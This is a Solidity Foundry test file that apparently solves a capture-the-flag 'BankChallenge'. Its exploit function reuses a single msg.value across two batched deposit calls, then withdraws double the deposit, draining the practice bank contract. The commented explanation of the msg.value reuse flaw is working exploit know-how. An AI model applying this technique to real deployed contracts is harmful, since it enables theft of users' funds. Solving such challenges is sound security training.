// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.10;

import "./utils/BaseTest.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "src/accounts/BankChallenge.sol";

contract TestBankChallenge is BaseTest {
    BankChallenge private challenge;
    Bank private bank;

    address private player;

    uint256 constant BANK_INITIAL_FUNDS = 1 ether;

    constructor() {
        // Created (during `setUp()`) users will be available in `users` state variable

        string[] memory userLabels = new string[](1);
        userLabels[0] = "Player";
        preSetUp(userLabels.length, 100 ether, userLabels);
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();

        // Deployer create the BankChallenge with some funds, attacker needs to steal them
        challenge = new BankChallenge{value: BANK_INITIAL_FUNDS}();
        bank = challenge.bank();
        player = users[0];
    }

    function testExploit() public {
        runTest();
    }

    function exploit() internal override {
        vm.startPrank(player);

        // We are going to exploit by calling two times in batch the `deposit` function
        // the `batch` function will allow us to call `deposit` using the same amount of `msg.value` instead of counting
        // it only once. In this way, after the two calls the contract think that we have deposited double the amount
        // and we are able to steal the other ether deposited by the deployer
        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSignature("deposit()");
        calls[1] = abi.encodeWithSignature("deposit()");
        bank.batch{value: 1 ether}(calls, true);

        bank.withdraw(2 ether);

        vm.stopPrank();
    }

    function success() internal override {
        /** SUCCESS CONDITIONS */
        assertEq(challenge.isSolved(), true);
    }
}
